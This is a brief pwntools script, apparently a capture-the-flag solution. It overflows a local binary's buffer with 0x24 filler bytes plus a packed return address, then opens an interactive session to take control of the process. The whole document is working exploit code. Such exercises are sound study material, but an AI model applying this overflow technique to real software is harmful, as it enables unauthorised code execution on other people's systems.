from pwn import *

p = process('./1')
p.recvuntil('>')
p.sendline('abcd')
payload =  'a'*0x24 + p32(0x80486CC)
p.sendline(payload)
p.interactive()
